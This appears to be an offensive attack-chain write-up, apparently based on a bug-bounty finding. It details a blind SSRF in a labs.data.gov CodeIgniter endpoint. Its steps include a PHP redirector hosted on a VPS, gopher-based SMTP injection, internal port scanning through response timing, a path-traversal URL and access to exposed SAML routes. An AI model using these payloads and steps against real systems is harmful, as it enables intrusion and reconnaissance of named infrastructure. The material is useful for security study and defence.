# Blind SSRF in Campaign Controller Enabling Internal Reconnaissance and SMTP Injection

Multi-stage attack chain demonstrating exploitation of a blind Server-Side Request Forgery (SSRF) vulnerability in the https://labs.data.gov/dashboard/Campaign/json_status/ endpoint of a PHP CodeIgniter application. The attack begins with source code review to identify improper route handling, progresses to SSRF exploitation using gopher protocol for internal port scanning and SMTP interactions, includes limited local file inclusion (LFI), and leverages route misconfigurations for unauthorized access to internal functions like SAML metadata.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Source Code Review] --> B[Identify SSRF Endpoint]
    B --> C[Setup Chaining Infrastructure]
    C --> D[SMTP Injection via Gopher]
    D --> E[Manual Port Scanning]
    E --> F[LFI Exploitation]
    F --> G[Access Misconfigured Routes]
    G --> H[Automated Port Scanning]
    H --> I[Internal Reconnaissance Complete]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#9b59b6
    style G fill:#9b59b6
    style H fill:#27ae60
    style I fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/netcat]]
- [[tools/python-requests]]

### Target Environment

- PHP CodeIgniter application hosted on AWS EC2
- Open ports: 25 (SMTP), 80 (HTTP), 443 (HTTPS), 8080
- Services: SMTP, SAML, nginx web server

### Initial Access Requirements

- Public access to the web application (no authentication needed)
- VPS or external server for hosting chaining scripts
- Network access to send HTTP requests to the target

## Detailed Attack Procedures

### Step 1: Source Code Review
procedure: [[procedures/Review-Source-Code-for-Route-Vulnerabilities]]

**Objective**: Identify improper route handling in the PHP application to discover callable public functions without validation.

**Instructions**: Examine the GitHub repository for controllers, noting that all public functions are directly invocable via URL parameters like /dashboard/Class/Function/Param1/Param2.

**Expected Output**: Identification of vulnerable endpoints such as /dashboard/Campaign/json_status/.

**Success Indicators**:
- Confirmation of public function exposure
- No authentication checks observed

### Step 2: Identify SSRF Endpoint
procedure: [[procedures/Identify-SSRF-in-Json-Status-Function]]

**Objective**: Locate the json_status function and confirm it accepts arbitrary URLs without validation.

**Instructions**: Review the Campaign.php controller to see the function signature public function json_status($status, $real_url = null, $component = null), which processes $real_url directly.

**Expected Output**: Understanding that arbitrary protocols like gopher:// can be injected.

**Success Indicators**:
- Function accepts unvalidated input
- Potential for SSRF confirmed

### Step 3: Setup Chaining Infrastructure
procedure: [[procedures/Setup-Chaining-PHP-for-Gopher-Payloads]]

**Objective**: Prepare a malicious PHP redirector on a VPS to chain external requests to internal gopher payloads.

**Instructions**: Create and host o.php on a VPS at http://51.178.47.176/o.php using [[commands/cat-malicious-php-file]] to verify contents.

```bash
cat o.php
```

**Expected Output**: PHP file contents displayed as <?php $s = $_GET["s"]; header("Location: ".$s); ?>.

**Success Indicators**:
- File hosted and accessible
- Redirect functionality tested

### Step 4: SMTP Injection
procedure: [[procedures/Exploit-SSRF-for-SMTP-Injection]]

**Objective**: Use SSRF to send SMTP commands to localhost port 25, enabling email spoofing or injection.

**Instructions**: Craft and send an encoded payload to /dashboard/Campaign/json_status/ chaining to the VPS PHP, which redirects to gopher:// on port 25 with SMTP commands like HELO, MAIL FROM, RCPT TO, DATA. Listen with [[commands/nc-listen-smtp-port]] on the VPS.

```bash
nc -lvp 25
```

**Expected Output**: Incoming connections capturing SMTP commands from the target's IP (ec2-18-213-100-122.compute-1.amazonaws.com).

**Success Indicators**:
- SMTP interactions received
- Commands like MAIL FROM: and RCPT TO: executed

### Step 5: Manual Port Scanning
procedure: [[procedures/Perform-Manual-Port-Scanning-via-SSRF]]

**Objective**: Scan internal ports using SSRF response times and timeouts to identify open services.

**Instructions**: Send requests like GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445/ for closed ports (fast response) and gopher://127.0.0.1:443 for open (timeout).

**Expected Output**: Response times indicating open ports (e.g., 25, 443 timeout; 8080 fast response).

**Success Indicators**:
- Open ports identified (25, 80, 443)
- Closed ports confirmed

### Step 6: LFI Exploitation
procedure: [[procedures/Exploit-LFI-in-Docs-Controller]]

**Objective**: Read unauthorized files using limited path traversal in the Docs controller.

**Instructions**: Access https://labs.data.gov/dashboard/Docs/index/..%2fREADME to bypass partial path restrictions and read README.md from root.

**Expected Output**: Contents of README.md file disclosed.

**Success Indicators**:
- File contents retrieved
- Path traversal partially successful despite .md append

### Step 7: Access Misconfigured Routes
procedure: [[procedures/Access-Misconfigured-Routes-for-Disclosure]]

**Objective**: Call non-GUI functions directly to expose internal data like SAML metadata and stack traces.

**Instructions**: Invoke endpoints such as /dashboard/user/metadata for SAML XML, /dashboard/simplesaml/module.php/core/frontpage_welcome.php, and /dashboard/user/acs for errors.

**Expected Output**: SAML metadata XML and stack traces revealed.

**Success Indicators**:
- Unauthorized internal functions accessed
- Sensitive information disclosed

### Step 8: Automated Port Scanning
procedure: [[procedures/Automate-Port-Scanning-with-Python-Script]]

**Objective**: Automate SSRF-based port scanning for ports 0-499 using a Python script.

**Instructions**: Run [[commands/python-ssrf-port-scanner]] to send requests and detect open ports via timeouts.

```bash
python exp.py
```

**Expected Output**: Output like "PORT: 25 OPEN", "PORT: 80 OPEN", "PORT: 443 OPEN".

**Success Indicators**:
- Multiple open ports detected
- Automation confirms manual findings

## Attack Chain Summary

### Key Achievements

1. Blind SSRF exploitation for internal network reconnaissance via port scanning.
2. SMTP command injection enabling potential email spoofing.
3. Limited LFI for file disclosure and route misconfiguration for SAML exposure.
4. Chained external VPS for bypassing direct gopher limitations.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Service Scanning]] Network Service Scanning
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery
- [[Reconnaissance]] Reconnaissance

---

*Last updated: 2023-10-01T00:00:00Z*
